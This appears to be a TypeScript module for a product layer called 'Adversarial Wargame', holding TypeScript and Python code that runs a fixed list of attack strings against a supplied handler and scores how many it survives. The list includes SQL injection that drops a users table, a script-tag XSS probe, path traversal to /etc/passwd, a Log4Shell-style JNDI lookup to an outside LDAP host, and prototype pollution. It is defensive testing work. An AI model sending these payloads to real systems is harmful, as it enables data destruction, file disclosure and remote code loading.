/**
 * CMPSBL® Inventory Layer — Adversarial Wargame
 * Primitives: ATTACK · DEFEND · SCORE
 *
 * Continuously red-teams every capability with a generated attack corpus
 * and reports defense-pass rate. Distinct from cyber-defense (runtime
 * blocking) — this is offensive QA that hardens the surface pre-attack.
 */
import type { CmpsblLayerDefinition } from '../types';

const TS = `
// ╔═══════════════════════════════════════════════════════════════════════════════╗
// ║  ASCENSION LAYER — Adversarial Wargame (proprietary).                         ║
// ╚═══════════════════════════════════════════════════════════════════════════════╝

interface CmpsblWargameResult { capability: string; attacks: number; passed: number; passRate: number; failedSamples: string[]; }
const _CMPSBL_WARGAME_HISTORY = new Map<string, CmpsblWargameResult>();

const _CMPSBL_WARGAME_CORPUS = [
  "'; DROP TABLE users; --",
  '<script>alert(1)</script>',
  '../../../etc/passwd',
  '\\${jndi:ldap://x.com/a}',
  '%00\\x00null',
  'A'.repeat(100000),
  '\\u202e\\u202d',
  '{"__proto__":{"polluted":true}}',
];

export function cmpsbl_wg_attack(
  capability: string,
  defender: (input: Record<string, unknown>) => unknown,
): CmpsblWargameResult {
  let passed = 0;
  const failedSamples: string[] = [];
  for (const sample of _CMPSBL_WARGAME_CORPUS) {
    try {
      defender({ payload: sample });
      passed += 1;
    } catch {
      failedSamples.push(sample.slice(0, 32));
    }
  }
  const result: CmpsblWargameResult = {
    capability,
    attacks: _CMPSBL_WARGAME_CORPUS.length,
    passed,
    passRate: passed / _CMPSBL_WARGAME_CORPUS.length,
    failedSamples,
  };
  _CMPSBL_WARGAME_HISTORY.set(capability, result);
  return result;
}

export function cmpsbl_wg_score(): { capabilities: number; avgPassRate: number; weakest: string | null } {
  const all = Array.from(_CMPSBL_WARGAME_HISTORY.values());
  if (all.length === 0) return { capabilities: 0, avgPassRate: 1, weakest: null };
  const avg = all.reduce((s, r) => s + r.passRate, 0) / all.length;
  const weakest = all.reduce((min, r) => r.passRate < min.passRate ? r : min, all[0]);
  return { capabilities: all.length, avgPassRate: avg, weakest: weakest.capability };
}
`;

const PY = `
# ╔═══════════════════════════════════════════════════════════════════════════════╗
# ║  ASCENSION LAYER — Adversarial Wargame (proprietary).                         ║
# ╚═══════════════════════════════════════════════════════════════════════════════╝

from typing import Callable, Dict

_CMPSBL_WARGAME_HISTORY: Dict[str, dict] = {}
_CMPSBL_WARGAME_CORPUS = [
    "'; DROP TABLE users; --",
    '<script>alert(1)</script>',
    '../../../etc/passwd',
    '${jndi:ldap://x.com/a}',
    '%00\\x00null',
    'A' * 100000,
    '\\u202e\\u202d',
    '{"__proto__":{"polluted":true}}',
]

def cmpsbl_wg_attack(capability: str, defender: Callable[[dict], object]) -> dict:
    passed = 0
    failed_samples = []
    for sample in _CMPSBL_WARGAME_CORPUS:
        try:
            defender({ 'payload': sample })
            passed += 1
        except Exception:
            failed_samples.append(sample[:32])
    result = {
        'capability': capability,
        'attacks': len(_CMPSBL_WARGAME_CORPUS),
        'passed': passed,
        'pass_rate': passed / len(_CMPSBL_WARGAME_CORPUS),
        'failed_samples': failed_samples,
    }
    _CMPSBL_WARGAME_HISTORY[capability] = result
    return result

def cmpsbl_wg_score() -> dict:
    all_r = list(_CMPSBL_WARGAME_HISTORY.values())
    if not all_r: return { 'capabilities': 0, 'avg_pass_rate': 1.0, 'weakest': None }
    avg = sum(r['pass_rate'] for r in all_r) / len(all_r)
    weakest = min(all_r, key=lambda r: r['pass_rate'])
    return { 'capabilities': len(all_r), 'avg_pass_rate': avg, 'weakest': weakest['capability'] }
`;

const WIRE_TS = `
// Adversarial Wargame is opt-in: customer code calls cmpsbl_wg_attack(name, fn) periodically.
// No transparent wrapper — wargame must be invoked outside the request path.`;

const WIRE_PY = `
# Adversarial Wargame is opt-in: customer code calls cmpsbl_wg_attack(name, fn) periodically.`;

export const ADVERSARIAL_WARGAME_LAYER: CmpsblLayerDefinition = {
  id: 'adversarial-wargame',
  name: 'Adversarial Wargame',
  crownJewelRank: 70,
  cjpi: 95,
  module: 'DEFENSE×EVOLUTION',
  description: 'Continuous red-team corpus runs against every capability; reports pass-rate and weakest defender.',
  priceCents: 7900,
  tsCode: TS,
  pyCode: PY,
  autoWire: {
    wrapperName: 'cmpsbl_wg_attack',
    behavior: 'Opt-in QA — invoke periodically against named capabilities; surface dashboards from cmpsbl_wg_score.',
    tsWire: WIRE_TS,
    pyWire: WIRE_PY,
  },
};
